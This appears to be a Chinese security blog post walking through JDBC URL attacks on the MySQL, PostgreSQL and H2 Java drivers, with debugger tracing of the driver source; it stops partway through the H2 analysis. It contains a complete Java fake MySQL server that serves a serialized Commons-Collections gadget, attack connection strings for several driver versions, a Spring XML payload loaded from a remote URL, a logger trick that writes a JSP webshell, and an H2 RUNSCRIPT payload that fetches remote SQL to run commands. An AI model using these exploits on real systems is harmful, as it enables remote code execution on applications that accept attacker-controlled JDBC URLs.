---
title: "JDBC Attack漫谈"
onlyTitle: true
date: 2024-12-1 14:44:21
categories:
- java
- other漏洞
tags:
- JDBC
top: true
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8119.jpg
---

20年开始就很多复现了，现在才赶来学习

议题最开始在 BlackHat Europe 2019 上由 Back2Zero 团队给出演讲，后在欧洲顶级信息安全会议 HITB SECCONF SIN-2021 上由 Litch1 & pyn3rd 进行了拓展和延伸。

HACK IN THE BOX（HITB）作为国际公认的最具影响力的信息安全会议，目前已成为全球十大安全峰会之一，演讲议题录用比例低于10%

以下为两次分享的 PPT 地址：

https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf

https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126215912065.png)

# JAVA JDBC

简介：JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(JDBC)

JDBC Connection：JDBC定义了一个叫`java.sql.Driver`的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。`java.sql.DriverManager.getConnection(xxx)`其实就是间接的调用了`java.sql.Driver`类的`connect`方法实现数据库连接的。数据库连接成功后会返回一个叫做`java.sql.Connection`的数据库连接对象，一切对数据库的查询操作都将依赖于这个`Connection`对象。

连接的格式如下

```http
jdbc:driver://host:port/database?setting1=value1&setting2=value2
```

所以JDBC攻击是什么？

在进行数据库连接的时候会指定数据库的URL和连接配置

```java
Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/test","root", "root");
```

如果JDBC URL的参数被攻击者控制，可以让其指向恶意SQL服务器

不同的SQL服务器对应JAVA中的Impl API不同，具体如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image.png)

## Mysql JDBC Attack

JDBC连接MySQL服务器时，会默认执行几个内置的SQL语句，查询的结果集会在Mysql客户端调用ObjectInputStream#readObject进行反序列化。其中原因也很好理解，数据都是序列化传输的

攻击者可以搭建恶意Mysql服务器，返回精心构造的结果集，对Mysql客户端进行反序列化攻击

### 环境搭建

调试所需的maven pom

```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>8.0.13</version>
</dependency>
```

因为打的是CC链，所以加的依赖进行测试

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

恶意Mysql服务器搭建：

https://github.com/fnmsd/MySQL_Fake_Server

修改config.json，注意该mysql会用yso生成gadget，根据注释修改

```json
{
     "config":{
        "ysoserialPath":"ysoserial-0.0.6-SNAPSHOT-all.jar", //YsoSerial位置
        "javaBinPath":"java",//java运行命令位置
        "fileOutputDir":"./fileOutput/",//读取文件的保存目录
        "displayFileContentOnScreen":true,//是否输出文件内容预览到控制台
        "saveToFile":true//是否保存文件
    },
//文件读取参数
    "fileread":{
        "win_ini":"c:\\windows\\win.ini",//key为设定的用户名,value为要读取的文件路径
        "win_hosts":"c:\\windows\\system32\\drivers\\etc\\hosts",
        "win":"c:\\windows\\",
        "linux_passwd":"/etc/passwd",
        "linux_hosts":"/etc/hosts",
        "index_php":"index.php",
        "__defaultFiles":["/etc/hosts","c:\\windows\\system32\\drivers\\etc\\hosts"]//未知用户名情况下随机选择文件读取

    },
//ysoserial参数
    "yso":{
        "Jdk7u21":["Jdk7u21","calc"]//key为设定的用户名,value为ysoserial参数的参数
    }
}
```

报错：`AttributeError: module 'asyncio' has no attribute 'coroutine'. Did you mean: 'coroutines'?`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127183729919.png)

包含`@asyncio.coroutine` 装饰器的将从**Python3.11**中删除，因此**`asyncio`** 模块没有`@asyncio.coroutine` 装饰符

改代码的话比较麻烦，建议开个3.0-3.10的python虚拟机，或者自己写个mysql server

由于我没有用yso的需求，所以写个mysql服务器也比较方便，fnmsd师傅对JDBC连接过程中的全部TCP进行抓包，分析了客户端与mysql服务器进行交互的全部流程，然后重现整个交互流程

```java
package org.exploit.JDBC;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class JDBC_Attack_server {
    private static final String GREETING_DATA = "4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400";
    private static final String RESPONSE_OK_DATA = "0700000200000002000000";
    private static final String PAYLOAD_FILE = "cc6.ser";

    public static void main(String[] args) {
        String host = "0.0.0.0";
        int port = 3306;

        try (ServerSocket serverSocket = new ServerSocket(port, 50, InetAddress.getByName(host))) {
            System.out.println("Start fake MySQL server listening on " + host + ":" + port);

            while (true) {
                try (Socket clientSocket = serverSocket.accept()) {
                    System.out.println("Connection come from " + clientSocket.getInetAddress() + ":" + clientSocket.getPort());

                    // Send greeting data
                    sendData(clientSocket, GREETING_DATA);

                    while (true) {
                        // Login simulation: Client sends request login, server responds with OK
                        receiveData(clientSocket);
                        sendData(clientSocket, RESPONSE_OK_DATA);

                        // Other processes
                        String data = receiveData(clientSocket);
                        if (data.contains("session.auto_increment_increment")) {
                            String payload = "01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000";
                            sendData(clientSocket, payload);
                            data = receiveData(clientSocket);
                        } else if (data.contains("SHOW WARNINGS")) {
                            String payload = "01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000";
                            sendData(clientSocket, payload);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SET NAMES")) {
                            sendData(clientSocket, RESPONSE_OK_DATA);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SET character_set_results")) {
                            sendData(clientSocket, RESPONSE_OK_DATA);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SHOW SESSION STATUS")) {
                            StringBuilder mysqlDatafinal = new StringBuilder();
                            String mysqlData = "0100000102";
                            mysqlData += "1a000002036465660001630163016301630c3f00ffff0000fc9000000000";
                            mysqlData += "1a000003036465660001630163016301630c3f00ffff0000fc9000000000";

                            // Get payload
                            String payloadContent = getPayloadContent();
                            if (payloadContent != null) {
                                // 计算 payload 长度并转为十六进制格式
                                String payloadLength = Integer.toHexString(payloadContent.length() / 2); // Python中的 //2 在Java中是使用除法
                                payloadLength = String.format("%4s", payloadLength).replace(' ', '0');  // 补充0，保持四位长度
                                String payloadLengthHex = payloadLength.substring(2, 4) + payloadLength.substring(0, 2); // 反转顺序

                                // 计算数据包总长度
                                int totalLength = payloadContent.length() / 2 + 4;
                                String dataLen = Integer.toHexString(totalLength);
                                dataLen = String.format("%6s", dataLen).replace(' ', '0'); // 补充0，保持六位长度
                                String dataLenHex = dataLen.substring(4, 6) + dataLen.substring(2, 4) + dataLen.substring(0, 2); // 反转顺序

                                // 构造最终的 MySQL 数据包
                                mysqlDatafinal.append(mysqlData).append(dataLenHex)
                                        .append("04")
                                        .append("fbfc")
                                        .append(payloadLengthHex)
                                        .append(payloadContent)  // 这里应该是 payload 的内容，假设它是一个十六进制字符串
                                        .append("07000005fe000022000100");
                            }
                            String mysqlstring = mysqlDatafinal.toString();
                            sendData(clientSocket, mysqlstring);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SHOW WARNINGS")) {
                            String payload = "01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000";
                            sendData(clientSocket, payload);
                        }
                        break;
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Receive data from client
    private static String receiveData(Socket socket) throws IOException {
        byte[] buffer = new byte[1024];
        InputStream inputStream = socket.getInputStream();
        int bytesRead = inputStream.read(buffer);
        String asciiString = new String(Arrays.copyOf(buffer, bytesRead), StandardCharsets.US_ASCII);
        String data =  asciiString;
        System.out.println("[*] Receiving the package: " + data);
        return data;
    }

    // Send data to client
    private static void sendData(Socket socket, String data) throws IOException {
        System.out.println("[*] Sending the package: " + data);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(hexToBytes(data));
        outputStream.flush();
    }

    // Convert byte array to hexadecimal string
    private static String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }

    // Convert hexadecimal string to byte array
    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] bytes = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            bytes[i / 2] = (byte) Integer.parseInt(hex.substring(i, i + 2), 16);
        }
        return bytes;
    }

    // Get payload content from file
    private static String getPayloadContent() {
        File file = new File(PAYLOAD_FILE);
        if (file.exists()) {
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] bytes = new byte[(int) file.length()];
                fis.read(bytes);
                return bytesToHex(bytes);
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Payload file not found");
        }
        return "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878";
    }
}
```

测试payload：

```java
//用于测试的受害JDBC Client
public class JDBC_Attack_Client {
    public static void main(String[] args) throws Exception {
        String ClassName = "com.mysql.jdbc.Driver";
        String JDBC_Url = "jdbc:mysql://127.0.0.1:3306/test?"+
                "autoDeserialize=true"+
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        String username = "root";
        String password = "root";
        Class.forName(ClassName);
        Connection connection = DriverManager.getConnection(JDBC_Url, username, password);
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JDBC_Mysql_Attack.gif)

也可以学习su18佬用cobar做恶意server

https://paper.seebug.org/1832/



### 源码分析

这个调试有点复杂

先来看看getConnection `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`会发生些什么

autoDeserialize参数是本漏洞的关键，这个参数为true时，JDBC客户端会自动反序列化服务端返回的数据

在getConnection处打上断点，跟进到NonRegisteringDriver.connect，先调用了acceptsUrl去检查url，然后调用getConnectionUrlInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127214810866.png)

跟进accesptsUrl发现，只是判断url非空，和schema部分要包含固定字符串

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127214946775.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127215014212.png)

继续跟进getConnectionUrlInstance，前面的代码是从cache表里看是否加载过了，略过；直接看到parseConnectionString解析JDBC串

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127215924256.png)

跟进到ConnectionUrlParser.parseConnectionString，用CONNECTION_STRING_PTRN matcher去解析正则匹配JDBC串

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127220634371.png)

正则如下：

```java
private static final Pattern CONNECTION_STRING_PTRN = Pattern.compile("(?<scheme>[\\w:%]+)\\s*(?://(?<authority>[^/?#]*))?\\s*(?:/(?!\\s*/)(?<path>[^?#]*))?(?:\\?(?!\\s*\\?)(?<query>[^#]*))?(?:\\s*#(?<fragment>.*))?");
```

最后分割的字符串如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221115430.png)

因为schema为`jdbc:mysql`，理所当然的走到了case SIGLE_CONMNECTION，实例化了`com.mysql.cj.conf.url.SingleConnectionUrl`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221333134.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221410824.png)

继续回到NonRegisteringDriver.connect，调用ConnectionImpl.getInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221634625.png)

跟进到createNewIO -> ConnectOneTryOnly -> initializePropsFromServer -> handleAutoCommitDefaults -> setAutoCommit，调用execSQL

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127223104495.png)

接着调用sendQueryString

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127223228191.png)

第一次发送了`SET autocommit=1`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128105736061.png)

跟进到queryPacket为`SET autocommit=1`的sendQueryPacket内

调用了invokeQueryInterceptorsPre，这里的interceptors是NoSubInterceptorWrapper包装的ServerStatusDiffInterceptor

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128110351849.png)

而且是在发送`SET autocommit=1`Packet之前调用的invokeQueryInterceptorsPre

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111810314.png)

跟进到三个形参invokeQueryInterceptorsPre，这是一个很关键的函数。循环调用了interceptors的preProcess方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128110558859.png)

这就是在官网手册所说的，实现了`com.mysql.cj.interceptors.QueryInterceptor`接口的类，会调用重写的proProcess方法来处理SQL查询和处理SQL结果

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111254101.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111323309.png)

跟进到ServerStatusDiffInterceptor，调用了populateMapWithSessionStatusValues

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111424409.png)

该函数内，会先调用`executeQuery("SHOW SESSION STATUS")`，然后调用ResultSetUtil.resultSetToMap

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128113417732.png)

在发送SHOW SESSION STATUS之前已经完成了握手和配置这些基本的环节

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128114212993.png)

OK我们跟进一下`executeQuery("SHOW SESSION STATUS")`，又调用了`((NativeSession) locallyScopedConn.getSession()).execSQL`，什么套娃

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120028200.png)

继续套娃到invokeQueryInterceptorsPre，因为本包已经是被interceptor拦截下来，在interceptor preProcess发的包，所以锁验证不过，不会再次进入preProcess

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120315036.png)

终于跟到了发送数据包了！sendCommand发送`SHOW SESSION STATUS`数据包

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120647998.png)

sendCommand也会走一遍invokeQueryInterceptorsPre，不过这里是两个形参，对应参数的preProcess返回null

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128135857311.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128135905286.png)

最后在sendCommand发送了数据包

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128140037272.png)

对应Server接收到了SHOW SESSION STATUS

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128140050546.png)

在sendCommand之后，会调用readAllResults读取结果

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142216373.png)

按照scanForAndThrowDataTruncation -> convertShowWarningsToSQLWarnings的链子，跟到了发送SHOW WARNINGS的代码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142818395.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142902254.png)

如果不回复这个SHOW WARNINGS，会有解析问题

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143052796.png)

也就是说Client发送SHOW SESSION STATUS，接收到数据包后Client还发送了SHOW WARNINGS，并需要接收到正确的回答

接着看怎么处理的SHOW SESSION STATUS的回答，跟进到resultSetToMap

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143151377.png)

循环调用了rs.getObject读取数据

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143417526.png)

跟进到getObject(2)，进入case BLOB，对接收的数据进行反序列化，至此反序列化漏洞触发

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143524214.png)

### 流程总结

完整的走一遍流程，我们在setCommand打上断点，综合前面的分析内容：

1. Client连接mysql服务器，mysql服务器发出greeting招呼
2. Client发送需要的mysql基本信息，mysql服务器回复固定的数据

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143828655.png)

3. Client发出`SET NAMES latin1`，mysql服务器回复OK收到

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144024981.png)

4. Client发出`SET character_set_result = NULL`，mysql服务器回复OK收到

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144147929.png)

5. 然后Client想发送SET autocommit =1，配置的ServerStatusDiffInterceptor拦截器对消息进行预处理，于是分为了两个小步骤：

* Client发送SHOW SESSION STATUS确认mysql服务器状态，服务器返回了序列化数据
* Client发送SHOW WARNINGS，服务器返回固定消息以顺利通过warning检查

* 如果上面两个过程没问题，客户端用getObject处理SHOW SESSION STATUS返回的数据，触发反序列化漏洞

通信过程如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144947130.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128150930174.png)

我们的恶意mysql服务器去模拟整个通信流程完成RCE



### 其他的攻击手法

上文用的queryInterceptors参数指定的ServerStatusDiffInterceptor拦截器进行注入，不同的版本用的参数不同，但手法都大同小异



* ServerStatusDiffInterceptor做拦截器;

8.x：

```http
jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

6.x（属性名不同）

```http
jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

5.1.11及以上的5.x版本（包名没有cj）:

```http
jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
```

5.1.11及以下的5.1.x版本：同上，但是需要连接后执行查询

* detectCustomCollations

5.1.28 - 5.1.19

```http
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true
```

5.1.29 - 5.1.40

```http
jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&autoDeserialize=true
```

5.1.18以下的版本和5.1.41以上版本不能使用



## PostgreSQL JDBC Attack

影响范围：

9.4.1208 <=PgJDBC <42.2.25

42.3.0 <=PgJDBC < 42.3.2

### 出网SpeL

POC 来自：

https://github.com/advisories/GHSA-v7wg-cpwc-24m4

```
jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml
```

exp.xml：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg name="command" value="calc"/>
        <property name="whatever" value="#{pb.start()}"/>
    </bean>
</beans>
```

看POC应该是spel注入，那需要spring的依赖：

```xml
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>5.3.28</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-expression</artifactId>
    <version>5.3.28</version>
</dependency>
<dependency>
    <groupId>commons-logging</groupId>
    <artifactId>commons-logging</artifactId>
    <version>1.2</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-beans</artifactId>
    <version>5.3.28</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-context</artifactId>
    <version>5.3.28</version>
</dependency>
```

pom依赖：

```xml
<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.3.0</version>
</dependency>
```



测试Client：

```java
public static void main(String[] args) throws Exception {
    String URL = "jdbc:postgresql://127.0.0.1:11111/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:8888/ProcesserBuilder_calc.xml";
    DriverManager.registerDriver(new Driver());
    Connection connection = DriverManager.getConnection(URL);
    connection.close();
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JDBC_PostgreSQL_Attack.gif)



简单源码分析一下

#### 源码分析

跟到org.postgresql.connect中，要求url以`jdbc:postgresql:`开头

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129113359704.png)

跟进到调用parseURL

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114339027.png)

经过一堆分割解析出了如下Entry

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114615514.png)

然后跟进到makeConnection -> PgConnection -> ConnectionFactory.openConnection -> ConnectionFactoryImpl.openConnectionImpl -> SocketFactoryFactory.getSocketFactory -> ObjectFactory.instantiate

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114655485.png)

在ObjectFactory.instantiate内，调用了构造函数进行实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129115253321.png)



### 不出网写文件

不出网的话用loggerLevel + loggerFile写文件

`=`截断掉前面的shell内容绕过URLDecoder的处理

```java
public static void main(String[] args) throws Exception {
    String URL = "jdbc:postgresql://127.0.0.1:11111/test/?loggerLevel=DEBUG&loggerFile=shell.jsp&<%Runtime.getRuntime().exec(\"calc\")};%> =\n";
    DriverManager.registerDriver(new Driver());
    Connection connection = DriverManager.getConnection(URL);
    connection.close();
}
```



## H2database

### 环境搭建

h2 database console 可以整合到Springboot中，也可以独立启动，因为其内置了一个WebServer

下载：

http://www.h2database.com/html/cheatSheet.html

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129135814207.png)

我这里下的最新的2.3.232版本

启动Web console，默认监听8082端口

```shell
java -cp .\h2-2.3.232.jar org.h2.tools.Server -web -webAllowOthers -ifNotExists
```

对h2 web console的利用需要开启`-webAllowOthers`选项，支持外部连接；需要开启`-ifNotExists`选项，支持创建数据库

H2的Web console不仅可以连接H2数据库，也可以连接其他支持JDBC API的数据库

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129145054882.png)



如果目标h2 web console是以 `-ifNotExists`打开的，那用以下payload进行测试：

```http
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
```

poc.sql：

```sql
DROP ALIAS IF EXISTS shell;
CREATE ALIAS shell AS $$void shell(String s) throws Exception {
    java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT shell('cmd /c calc');
```

会成功弹出计算器。两个`$`在h2中表示定义函数

该payload利用前提是h2 console连接的数据库存在，所以要么真有这个数据库，要么启动console的时候带上`-ifNotExists`参数。

但是h2数据库的JDBC URL中支持`INIT`配置，这个参数表示在连接h2数据库的时候，会执行一条初始化命令。不过只能执行一条，且不能包含分号

上面的`CREATE ALIAS`不止一条，可以用`RUNSCRIPT`执行一个SQL文件

```http
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/evil.sql'
```

该payload适用于任何有H2依赖的JDBC URL

```java
public class H2database_JDBC_Client {
    public static void main(String[] args) throws Exception {
        String ClassName = "org.h2.Driver";
        String JDBC_Url = "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/poc.sql'";
        String username = "root";
        String password = "root";
        Class.forName(ClassName);
        Connection connection = DriverManager.getConnection(JDBC_Url, username, password);
    }
}
```



### 源码分析

在getConnection打上断点，跟进到org.h2.Driver$connect，调用了JdbcConnection构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129170152105.png)

先调用了ConnectionInfo处理了URL，然后调用了SessionRemote.connectEmbeddedOrServer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129191349790.png)

继续跟进SessionRemote.connectEmbeddedOrServer -> Engine.createSession

